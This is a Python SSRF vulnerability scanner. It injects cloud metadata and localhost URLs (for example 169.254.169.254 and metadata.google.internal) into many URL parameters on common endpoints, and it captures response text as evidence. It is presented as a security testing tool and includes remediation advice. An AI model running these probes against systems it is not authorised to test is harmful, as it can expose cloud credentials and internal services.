#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Scanner Module
"""

import sys
import json
import time
from urllib.parse import quote, urlparse
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print(json.dumps({"success": False, "error": "requests library not installed"}))
    sys.exit(1)

class SSRFTester:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        
        # Cloud metadata endpoints
        self.ssrf_payloads = [
            ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
            ("Google Cloud Metadata", "http://metadata.google.internal/computeMetadata/v1/"),
            ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("Localhost", "http://127.0.0.1"),
            ("Internal Network", "http://localhost"),
            ("IPv6 Localhost", "http://[::1]"),
            ("Alternative Localhost", "http://0.0.0.0"),
        ]
        
    def test_endpoint(self, endpoint, payload_name, payload_url):
        """Test a specific endpoint for SSRF"""
        encoded_payload = quote(payload_url, safe='')
        
        test_urls = [
            f"{endpoint}?url={encoded_payload}",
            f"{endpoint}?redirect={encoded_payload}",
            f"{endpoint}?uri={encoded_payload}",
            f"{endpoint}?path={encoded_payload}",
            f"{endpoint}?dest={encoded_payload}",
            f"{endpoint}?destination={encoded_payload}",
            f"{endpoint}?next={encoded_payload}",
            f"{endpoint}?data={encoded_payload}",
            f"{endpoint}?reference={encoded_payload}",
            f"{endpoint}?site={encoded_payload}",
            f"{endpoint}?html={encoded_payload}",
            f"{endpoint}?val={encoded_payload}",
            f"{endpoint}?validate={encoded_payload}",
            f"{endpoint}?domain={encoded_payload}",
            f"{endpoint}?callback={encoded_payload}",
            f"{endpoint}?return={encoded_payload}",
            f"{endpoint}?page={encoded_payload}",
            f"{endpoint}?feed={encoded_payload}",
            f"{endpoint}?host={encoded_payload}",
            f"{endpoint}?port={encoded_payload}",
            f"{endpoint}?to={encoded_payload}",
            f"{endpoint}?out={encoded_payload}",
            f"{endpoint}?view={encoded_payload}",
            f"{endpoint}?dir={encoded_payload}",
        ]
        
        for test_url in test_urls:
            try:
                response = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                # Check for SSRF indicators
                indicators = [
                    "instance-id", "ami-id", "hostname", "local-ipv4",
                    "metadata", "computeMetadata", "azure",
                    "127.0.0.1", "localhost", "internal"
                ]
                
                if any(indicator in response.text.lower() for indicator in indicators):
                    return True, test_url, response.text[:500]
                    
            except Exception as e:
                continue
        
        return False, None, None
    
    def scan(self):
        """Main scanning function"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Common endpoints that might be vulnerable
        common_endpoints = [
            f"{base_url}/",
            f"{base_url}/api/fetch",
            f"{base_url}/api/proxy",
            f"{base_url}/redirect",
            f"{base_url}/proxy",
            f"{base_url}/fetch",
            f"{base_url}/load",
            f"{base_url}/download",
            f"{base_url}/image",
            f"{base_url}/api/image",
        ]
        
        for endpoint in common_endpoints:
            for payload_name, payload_url in self.ssrf_payloads:
                time.sleep(0.3)  # Rate limiting
                
                is_vuln, test_url, evidence = self.test_endpoint(endpoint, payload_name, payload_url)
                
                if is_vuln:
                    self.vulnerabilities.append({
                        "type": "SSRF",
                        "severity": "critical",
                        "title": f"SSRF Vulnerability - {payload_name}",
                        "description": f"Server-Side Request Forgery (SSRF) vulnerability detected. The application makes requests to attacker-controlled URLs, potentially exposing internal services and cloud metadata ({payload_name}).",
                        "payload": payload_url,
                        "evidence": evidence,
                        "remediation": "1. Implement URL whitelist validation. 2. Disable unnecessary URL schemas (file://, gopher://, etc). 3. Use network segmentation. 4. Implement cloud metadata protection (IMDSv2 for AWS). 5. Validate and sanitize all user-supplied URLs.",
                        "cvss": "9.1"
                    })
                    break  # Found vulnerability on this endpoint, move to next
        
        return {
            "success": True,
            "vulnerabilities": self.vulnerabilities,
            "total_tests": len(common_endpoints) * len(self.ssrf_payloads),
            "vulnerabilities_found": len(self.vulnerabilities)
        }

def main():
    if len(sys.argv) < 2:
        print(json.dumps({"success": False, "error": "Target URL required"}))
        sys.exit(1)
    
    target = sys.argv[1]
    tester = SSRFTester(target)
    result = tester.scan()
    
    print(json.dumps(result))

if __name__ == "__main__":
    main()
